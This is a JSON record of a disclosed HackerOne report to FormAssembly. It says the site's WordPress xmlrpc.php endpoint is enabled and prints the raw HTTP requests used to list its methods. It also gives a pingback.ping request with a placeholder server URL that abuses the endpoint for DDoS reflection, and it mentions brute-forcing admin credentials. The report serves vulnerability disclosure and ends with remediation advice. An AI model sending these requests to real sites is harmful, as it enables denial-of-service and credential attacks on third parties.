{
    "reported_to": "FormAssembly",
    "reported_by": "meepmerp ",
    "title": "xmlrpc.php file is enable it will used for (DOS) and bruteforce attack",
    "content": "\nWordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://www.formassembly.com/ has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.\nIn order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.\nPOST /wp/xmlrpc.php HTTP/1.1\nHost: www.formassembly.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Length: 91\nCode 342 Bytes\n1<methodCall>\n2<methodName>system.listMethods</methodName>\n3<params></params>\n4</methodCall>\n5***==================================================***\n6HTTP/1.1 200 OK\n7Date: Wed, 21 Nov 2018 16:43:06 GMT\n8Content-Type: text/xml; charset=UTF-8\n9Connection: close\n10Server: nginx\n11Vary: Accept-Encoding\n12X-XSS-Protection: 1; mode=block\n13Content-Length: 4272\nCode 4.13 KiB\n1<methodResponse>\n2  <params>\n3    <param>\n4      <value>\n5      <array><data>\n6  <value><string>system.multicall</string></value>\n7  <value><string>system.listMethods</string></value>\n8  <value><string>system.getCapabilities</string></value>\n9  <value><string>demo.addTwoNumbers</string></value>\n10  <value><string>demo.sayHello</string></value>\n11  <value><string>pingback.extensions.getPingbacks</string></value>\n12  <value><string>pingback.ping</string></value>\n13  <value><string>mt.publishPost</string></value>\n14  <value><string>mt.getTrackbackPings</string></value>\n15  <value><string>mt.supportedTextFilters</string></value>\n16  <value><string>mt.supportedMethods</string></value>\n17  <value><string>mt.setPostCategories</string></value>\n18  <value><string>mt.getPostCategories</string></value>\n19  <value><string>mt.getRecentPostTitles</string></value>\n20  <value><string>mt.getCategoryList</string></value>\n21  <value><string>metaWeblog.getUsersBlogs</string></value>\n22  <value><string>metaWeblog.deletePost</string></value>\n23  <value><string>metaWeblog.newMediaObject</string></value>\n24  <value><string>metaWeblog.getCategories</string></value>\n25  <value><string>metaWeblog.getRecentPosts</string></value>\n26  <value><string>metaWeblog.getPost</string></value>\n27  <value><string>metaWeblog.editPost</string></value>\n28  <value><string>metaWeblog.newPost</string></value>\n29  <value><string>blogger.deletePost</string></value>\n30  <value><string>blogger.editPost</string></value>\n31  <value><string>blogger.newPost</string></value>\n32  <value><string>blogger.getRecentPosts</string></value>\n33  <value><string>blogger.getPost</string></value>\n34  <value><string>blogger.getUserInfo</string></value>\n35  <value><string>blogger.getUsersBlogs</string></value>\n36  <value><string>wp.restoreRevision</string></value>\n37  <value><string>wp.getRevisions</string></value>\n38  <value><string>wp.getPostTypes</string></value>\n39  <value><string>wp.getPostType</string></value>\n40  <value><string>wp.getPostFormats</string></value>\n41  <value><string>wp.getMediaLibrary</string></value>\n42  <value><string>wp.getMediaItem</string></value>\n43  <value><string>wp.getCommentStatusList</string></value>\n44  <value><string>wp.newComment</string></value>\n45  <value><string>wp.editComment</string></value>\n46  <value><string>wp.deleteComment</string></value>\n47  <value><string>wp.getComments</string></value>\n48  <value><string>wp.getComment</string></value>\n49  <value><string>wp.setOptions</string></value>\n50  <value><string>wp.getOptions</string></value>\n51  <value><string>wp.getPageTemplates</string></value>\n52  <value><string>wp.getPageStatusList</string></value>\n53  <value><string>wp.getPostStatusList</string></value>\n54  <value><string>wp.getCommentCount</string></value>\n55  <value><string>wp.deleteFile</string></value>\n56  <value><string>wp.uploadFile</string></value>\n57  <value><string>wp.suggestCategories</string></value>\n58  <value><string>wp.deleteCategory</string></value>\n59  <value><string>wp.newCategory</string></value>\n60  <value><string>wp.getTags</string></value>\n61  <value><string>wp.getCategories</string></value>\n62  <value><string>wp.getAuthors</string></value>\n63  <value><string>wp.getPageList</string></value>\n64  <value><string>wp.editPage</string></value>\n65  <value><string>wp.deletePage</string></value>\n66  <value><string>wp.newPage</string></value>\n67  <value><string>wp.getPages</string></value>\n68  <value><string>wp.getPage</string></value>\n69  <value><string>wp.editProfile</string></value>\n70  <value><string>wp.getProfile</string></value>\n71  <value><string>wp.getUsers</string></value>\n72  <value><string>wp.getUser</string></value>\n73  <value><string>wp.getTaxonomies</string></value>\n74  <value><string>wp.getTaxonomy</string></value>\n75  <value><string>wp.getTerms</string></value>\n76  <value><string>wp.getTerm</string></value>\n77  <value><string>wp.deleteTerm</string></value>\n78  <value><string>wp.editTerm</string></value>\n79  <value><string>wp.newTerm</string></value>\n80  <value><string>wp.getPosts</string></value>\n81  <value><string>wp.getPost</string></value>\n82  <value><string>wp.deletePost</string></value>\n83  <value><string>wp.editPost</string></value>\n84  <value><string>wp.newPost</string></value>\n85  <value><string>wp.getUsersBlogs</string></value>\n86</data></array>\n87      </value>\n88    </param>\n89  </params>\n90</methodResponse>\nNotice that a successful response is received showing that the xmlrpc.php file is enabled.\nNow, considering the domain https://www.formassembly.com the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.\nPOST /wp/xmlrpc.php HTTP/1.1\nHost: www.formassembly.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Length: 91\nCode 240 Bytes\n1<methodCall>\n2<methodName>pingback.ping</methodName>\n3<params>\n4<param>\n5<value><string>http://<***YOUR SERVER*** ></string></value>\n6</param>\n7<param>\n8<value><string>https://www.formassembly.com/</string></value>\n9</param>\n10</params>\n11</methodCall>\nremediation:\nIf the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.\nThank you\nnote: screenshots are given below\nImpact\nThis method is also used for brute force attacks to stealing the admin credentials and other important credentials\nThis can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Uncontrolled Resource Consumption"
    ],
    "screenshots": {},
    "disclosed_date": 1545900900,
    "report_url": "https://hackerone.com/reports/448524",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Send a POST request to /wp/xmlrpc.php with the method system.listMethods to check if XML-RPC is enabled."
        ],
        [
            2,
            "If XML-RPC is enabled, send another POST request to /wp/xmlrpc.php with the method pingback.ping, specifying a target server and the victim's URL to initiate a DDoS attack."
        ]
    ],
    "vuln_description": "The XML-RPC interface in WordPress, specifically the xmlrpc.php file, is enabled and can be abused to perform DDoS attacks via pingback requests or brute force attacks to steal admin credentials. This file allows remote procedure calls which can be exploited to amplify attacks against other servers.",
    "reason": "The vulnerability involves a straightforward exploitation of a known feature (XML-RPC) in WordPress. The steps to reproduce are simple and well-documented, requiring no complex interactions or state manipulations.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}